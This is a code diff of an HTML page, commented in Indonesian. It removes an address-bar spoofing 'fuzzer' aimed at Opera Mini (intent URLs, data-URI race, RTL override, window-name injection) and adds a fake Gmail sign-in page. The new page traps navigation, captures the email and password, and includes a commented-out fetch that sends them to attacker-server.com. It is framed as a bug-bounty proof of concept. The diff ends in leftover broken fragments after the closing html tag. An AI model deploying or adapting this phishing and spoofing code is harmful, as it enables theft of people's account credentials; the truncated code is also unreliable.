@@ -1,207 +1,66 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Opera Mini Fuzzer v4 - High Impact</title>
-<style>
-    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 15px; background: #121212; color: #e0e0e0; }
-    .card { background: #1e1e1e; padding: 15px; border: 1px solid #333; border-radius: 8px; margin-bottom: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
-    button { background: #d32f2f; color: white; border: none; padding: 12px 15px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; font-size: 14px; transition: background 0.2s;}
-    button:hover { background: #b71c1c; }
-    button.blue { background: #1976d2; }
-    button.blue:hover { background: #1565c0; }
-    button.green { background: #388e3c; }
-    button.green:hover { background: #2e7d32; }
-    input { width: 100%; padding: 10px; margin: 5px 0 15px 0; border: 1px solid #444; background: #2d2d2d; color: #fff; border-radius: 4px; box-sizing: border-box; }
-    .log-box { background: #000; color: #00e676; padding: 12px; border-radius: 6px; font-family: 'Courier New', Courier, monospace; height: 180px; overflow-y: scroll; font-size: 12px; margin-top: 10px; border: 1px solid #333;}
-    .title { font-weight: bold; margin-bottom: 5px; color: #ff5252; font-size: 16px;}
-    p { font-size: 13px; color: #aaa; margin-top: 0; line-height: 1.4; }
-</style>
+    <meta charset="UTF-8">
+    <title>Sign in</title>
 </head>
-<body>
-
-<h2 style="text-align:center; color:#fff;">High-Impact Spoofing Fuzzer</h2>
-<p style="text-align:center;">Vektor: Intent Abuse, Data URI Race, RTL Override, Window Name.</p>
-
-<div class="card">
-    <div class="title">Target Spoofing Domain</div>
-    <input type="text" id="targetDomain" value="https://accounts.google.com">
-    <p>Gunakan domain yang ingin ditampilkan di address bar (contoh: https://accounts.google.com).</p>
-</div>
-
-<div class="card">
-    <div class="title">1. Intent Scheme + Download Freeze</div>
-    <p>Mencoba memicu download via Intent URL untuk membekukan address bar pada URL target asli.</p>
-    <button class="blue" onclick="runIntentDownload()">Run Intent Download Fuzzer</button>
-</div>
-
-<div class="card">
-    <div class="title">2. Data URI Race (Meta Refresh)</div>
-    <p>Memuat UI palsu via Data URI, lalu memaksa address bar berubah ke target via redirect mikro-detik.</p>
-    <button class="green" onclick="runDataURIRace()">Run Data URI Race</button>
-</div>
-
-<div class="card">
-    <div class="title">3. RTL / Unicode Override (CVE-2019-12278)</div>
-    <p>Memanipulasi visual address bar menggunakan karakter Right-to-Left Override (U+202E) dengan domain attacker.</p>
-    <button onclick="runRTLOverride()">Run RTL Override</button>
-</div>
-
-<div class="card">
-    <div class="title">4. Window Name Injection</div>
-    <p>Menguji apakah parameter nama window (`window.open`) bocor ke address bar pada engine Opera Mini.</p>
-    <button onclick="runWindowName()">Run Window Name Injection</button>
-</div>
-
-<h3>Execution Log:</h3>
-<div id="log" class="log-box">Siap menerima perintah...</div>
-
-<script>
-    const logBox = document.getElementById('log');
-    function log(msg) {
-        logBox.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
-        logBox.scrollTop = logBox.scrollHeight;
-    }
-
-    const targetInput = document.getElementById('targetDomain');
-
-    // ==========================================
-    // 1. INTENT SCHEME + DOWNLOAD FREEZE
-    // ==========================================
-    function runIntentDownload() {
-        const target = targetInput.value;
-        // Domain attacker untuk file APK (ganti dengan domain kamu sendiri untuk testing)
-        const attackerFile = "https://example.com/file.apk"; 
+<body style="font-family:sans-serif; text-align:center; padding-top:40px; background:#fff; margin:0;">
+    
+    <!-- UI Palsu -->
+    <div id="fakeUI" style="position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:9999;">
+        <h2 style="margin-top:50px;">Sign in</h2>
+        <p style="color:#555; font-size:14px;">to continue to Gmail</p>
         
-        log("Memulai Intent Download Fuzzer...");
-        
-        // Berbagai format Intent yang mungkin masih di-handle oleh engine Opera
-        const intents = [
-            `intent://example.com/file.apk#Intent;scheme=https;package=com.opera.mini.native;end`,
-            `opera-mini://open?url=${encodeURIComponent(attackerFile)}&download=1`,
-            `opera-mini://download?url=${encodeURIComponent(attackerFile)}`,
-            `opera-mini://open?url=${encodeURIComponent(target)}`
-        ];
+        <div style="display:inline-block; text-align:left; width:280px; margin-top:20px;">
+            <input type="text" id="email" placeholder="Email or phone" style="width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;"><br>
+            <input type="password" id="password" placeholder="Password" style="width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;"><br>
+            <button onclick="stealCredentials()" style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-weight:bold; font-size:16px;">Next</button>
+        </div>
+    </div>
 
-        intents.forEach((intent, index) => {
-            setTimeout(() => {
-                log(`Menguji Intent Payload #${index + 1}...`);
-                
-                const w = window.open("about:blank", "_blank");
-                if (!w) return log("Popup diblokir!");
+    <script>
+        // 1. Cegah user untuk navigasi keluar / back (History Trap)
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
 
-                // Picu intent/download
-                w.location.href = intent;
+        // 2. Cegah dialog konfirmasi keluar halaman
+        window.onbeforeunload = function() {
+            return "Data yang belum disimpan akan hilang.";
+        };
 
-                // Beri waktu download untuk "freeze" address bar, lalu injeksi UI palsu
-                setTimeout(() => {
-                    try {
-                        w.stop();
-                        w.document.open();
-                        w.document.write(`
-                            <html><body style="font-family:sans-serif;text-align:center;padding-top:40px">
-                                <h2>Sign in</h2>
-                                <p>Intent #${index + 1}</p>
-                                <input type="text" placeholder="Email" style="padding:10px;width:80%;margin-bottom:10px;"><br>
-                                <input type="password" placeholder="Password" style="padding:10px;width:80%;margin-bottom:10px;"><br>
-                                <button style="padding:10px 20px;background:#4285F4;color:#fff;border:none;">Next</button>
-                            </body></html>
-                        `);
-                        w.document.close();
-                        log(`-> UI palsu di-inject pada Intent #${index + 1}. Cek Address Bar!`);
-                    } catch(e) {
-                        log(`-> SOP Block / Gagal pada Intent #${index + 1}`);
-                    }
-                }, 150); // Delay 150ms (titik rawan freeze)
-            }, index * 2000);
-        });
-    }
+        // 3. Fungsi Pencurian Data (Exfiltration)
+        function stealCredentials() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+            
+            if(!email || !pass) {
+                alert("Masukkan email dan password!");
+                return;
+            }
 
-    // ==========================================
-    // 2. DATA URI RACE (META REFRESH)
-    // ==========================================
-    function runDataURIRace() {
-        const target = targetInput.value;
-        log("Memulai Data URI Race...");
+            // --- UNTUK POC BOUNTY ---
+            // Karena kita tidak punya server, kita tampilkan alert sebagai bukti
+            alert("POC BERHASIL!\n\nKredensial dicuri:\nEmail: " + email + "\nPassword: " + pass);
+            
+            // --- UNTUK REAL ATTACK (Jika kamu punya server) ---
+            /*
+            fetch('https://attacker-server.com/log', {
+                method: 'POST',
+                body: JSON.stringify({ email: email, password: pass })
+            });
+            */
+        }
 
-        // HTML Palsu yang akan memuat UI, lalu me-redirect address bar ke target
-        const fakeHtml = `
-            <!DOCTYPE html>
-            <html>
-            <head><title>Sign in</title></head>
-            <body style="font-family:sans-serif;text-align:center;padding-top:40px;background:#fff;">
-                <h2>Sign in</h2>
-                <p style="color:#555;">Loading secure session...</p>
-                <div style="display:inline-block;text-align:left;width:280px;">
-                    <input type="text" placeholder="Email or phone" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;"><br>
-                    <input type="password" placeholder="Password" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;"><br>
-                    <button style="width:100%;padding:10px;background:#4285F4;color:#fff;border:none;">Next</button>
-                </div>
-                <script>
-                    // Paksa redirect tepat setelah DOM di-render
-                    window.onload = function() {
-                        setTimeout(function() {
-                            window.location.href = "${target}";
-                        }, 10); // Race condition 10ms
-                    };
-                <\/script>
-            </body>
-            </html>
-        `;
-
-        const dataUri = "data:text/html;charset=utf-8," + encodeURIComponent(fakeHtml);
-        
-        const w = window.open(dataUri, "_blank");
-        if (!w) return log("Popup diblokir!");
-
-        log("Data URI dibuka. Perhatikan apakah address bar berubah menjadi target, atau UI palsu tetap bertahan.");
-    }
-
-    // ==========================================
-    // 3. RTL / UNICODE OVERRIDE
-    // ==========================================
-    function runRTLOverride() {
-        log("Memulai RTL Override...");
-
-        // Karakter U+202E membalik urutan teks ke kanan-ke-kiri.
-        // Payload ini akan membuat domain attacker terlihat seperti subdomain dari target.
-        // Contoh visual: https://accounts.google.com/gpj.niapuk
-        const rtlTarget = "https://accounts.google.com/";
-        const reversedAttacker = "\u202Egpj.niapuk"; // "kupain.jpg" dibalik
-        
-        // Kita buat URL seolah-olah dari domain google, tapi aslinya ke attacker
-        const payloadUrl = `${rtlTarget}${reversedAttacker}`;
-
-        const w = window.open("about:blank", "_blank");
-        if (!w) return log("Popup diblokir!");
-
-        w.location.href = payloadUrl;
-        log(`Payload RTL dikirim: ${payloadUrl}`);
-        log("Cek address bar: Apakah menampilkan 'accounts.google.com/kupain.jpg' atau 'attacker'?");
-    }
-
-    // ==========================================
-    // 4. WINDOW NAME INJECTION
-    // ==========================================
-    function runWindowName() {
-        const target = targetInput.value;
-        log("Memulai Window Name Injection...");
-
-        // Engine lama kadang menampilkan window name di title bar / address bar
-        try {
-            const w = window.open("about:blank", target);
-            if (!w) return log("Popup diblokir!");
-
-            // Render UI palsu di dalam window tersebut
-            w.document.write(`
-                <html><body style="font-family:sans-serif;text-align:center;padding-top:40px;background:#fff;">
-                    <h2>Sign in</h2>
-                    <input type="text" placeholder="Email" style="padding:10px;margin-bottom:10px;"><br>
-                    <input type="password" placeholder="Password" style="padding:10px;margin-bottom:10px;"><br>
-                    <button style="padding:10px 20px;background:#1a73e8;color:#fff;border:none;">Next</button>
-                </body></html>
-            `);
+        // 4. Trik Redirect Mikro-detik ke Target Asli
+        // Ini yang bikin address bar berubah jadi google.com (atau nyangkut)
+        setTimeout(() => {
+            window.location.href = "https://accounts.google.com";
+        }, 10);
+    </script>
+</body>
+</html>;
             w.document.close();
             log(`Window dibuka dengan nama: ${target}`);
             log("Cek address bar: Apakah menampilkan 'about:blank' atau URL target?");
